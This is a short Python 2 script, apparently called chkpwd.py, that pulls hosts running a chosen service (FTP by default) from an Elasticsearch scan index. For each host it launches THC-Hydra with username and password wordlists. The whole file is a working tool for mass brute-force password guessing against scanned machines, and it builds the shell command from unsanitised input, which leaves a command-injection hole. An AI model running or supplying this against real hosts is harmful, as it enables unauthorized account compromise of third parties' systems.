#!/usr/bin/env python

from datetime import datetime
from elasticsearch import Elasticsearch
import thread
import time
import os
import sys

es = Elasticsearch()
size = "10"
serv = "ftp"

if len(sys.argv) == 1:
    print """
        Uage: python chkpwd.py size serv
              python chkpwd.py 20   ftp
    """
    exit()
if len(sys.argv) >= 2:
    size = sys.argv[1]
if len(sys.argv)==3:
    serv = sys.argv[2]

# Search
res = es.search(index="scan_index", body={"size": size, "query": {"match" : {"name": serv }}})

print("Got %d Hits:" % res['hits']['total'])
print("Got %s Size:" % size)
print("Got %s Serv:" % serv)

for hit in res['hits']['hits']:
    print("%(timestamp)s %(host)s: %(port)s" % hit["_source"])
    cmd = "/root/Git/thc-hydra/hydra -L /root/Git/thc-hydra/name.txt -P /root/Git/thc-hydra/pass.txt "+serv+"://"+hit["_source"]["host"]
    os.system(cmd);


